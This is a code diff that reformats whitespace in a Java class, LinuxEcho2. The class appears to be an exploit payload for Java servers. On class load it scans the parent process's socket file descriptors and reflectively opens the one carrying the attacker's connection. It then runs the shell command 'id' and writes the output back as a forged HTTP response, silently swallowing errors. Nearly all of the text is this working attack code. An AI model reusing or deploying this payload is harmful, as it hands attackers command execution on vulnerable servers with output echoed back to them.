@@ -5,11 +5,11 @@ public class LinuxEcho2 {
     static {
         try {
             if (java.io.File.separator.equals("/")) {
-                String                 command = "ls -al /proc/$PPID/fd|grep socket:|awk 'BEGIN{FS=\"[\"}''{print $2}'|sed 's/.$//'";
-                String[]               cmd     = new String[]{"/bin/sh", "-c", command};
-                java.io.BufferedReader br      = new java.io.BufferedReader(new java.io.InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));
-                java.util.List         res1    = new java.util.ArrayList();
-                String                 line    = "";
+                String command = "ls -al /proc/$PPID/fd|grep socket:|awk 'BEGIN{FS=\"[\"}''{print $2}'|sed 's/.$//'";
+                String[] cmd = new String[]{"/bin/sh", "-c", command};
+                java.io.BufferedReader br = new java.io.BufferedReader(new java.io.InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));
+                java.util.List res1 = new java.util.ArrayList();
+                String line = "";
                 while ((line = br.readLine()) != null && !line.trim().isEmpty()) {
                     res1.add(line);
                 }
@@ -31,7 +31,7 @@ public class LinuxEcho2 {
                 br.close();
 
                 int index = 0;
-                int max   = 0;
+                int max = 0;
                 for (int i = 0; i < res2.size(); i++) {
                     try {
                         String socketNo = ((String) res2.get(i)).split("\\s+")[1].substring(8);
@@ -50,13 +50,13 @@ public class LinuxEcho2 {
                     }
                 }
 
-                int                           fd = Integer.parseInt(((String) res2.get(index)).split("\\s")[0]);
-                java.lang.reflect.Constructor c  = java.io.FileDescriptor.class.getDeclaredConstructor(new Class[]{Integer.TYPE});
+                int fd = Integer.parseInt(((String) res2.get(index)).split("\\s")[0]);
+                java.lang.reflect.Constructor c = java.io.FileDescriptor.class.getDeclaredConstructor(new Class[]{Integer.TYPE});
                 c.setAccessible(true);
                 cmd = new String[]{"/bin/sh", "-c", "id"};
-                String                   res    = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();
-                String                   result = "HTTP/1.1 200 OK\nConnection: close\nContent-Length: " + res.length() + "\n\n" + res + "\n";
-                java.io.FileOutputStream os     = new java.io.FileOutputStream((java.io.FileDescriptor) c.newInstance(new Object[]{new Integer(fd)}));
+                String res = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();
+                String result = "HTTP/1.1 200 OK\nConnection: close\nContent-Length: " + res.length() + "\n\n" + res + "\n";
+                java.io.FileOutputStream os = new java.io.FileOutputStream((java.io.FileDescriptor) c.newInstance(new Object[]{new Integer(fd)}));
                 os.write(result.getBytes());
             }
         } catch (Exception ignored) {
